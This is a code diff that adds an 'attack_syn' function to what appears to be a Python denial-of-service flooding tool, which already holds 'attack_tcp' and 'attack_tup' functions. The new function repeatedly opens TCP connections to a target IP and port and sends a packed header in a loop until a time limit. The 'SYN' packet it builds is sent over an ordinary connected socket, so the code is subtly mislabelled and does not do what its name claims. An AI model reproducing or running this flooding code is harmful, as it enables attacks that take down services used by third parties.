@@ -99,6 +99,18 @@ def attack_tcp(ip, port, secs, size=65500):
         except:
             pass
 
+def attack_syn(ip, port, secs):
+    while time.time() < secs:
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        flags = 0b01000000
+        try:
+            s.connect((ip, port))
+            pkt = struct.pack('!HHIIBBHHH', 1234, 5678, 0, 1234, flags, 0, 0, 0, 0)
+            while time.time() < secs:
+                s.send(pkt)
+        except:
+            s.close()
+
 def attack_tup(ip, port, secs, size=65500):
     while time.time() < secs:
         udp = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
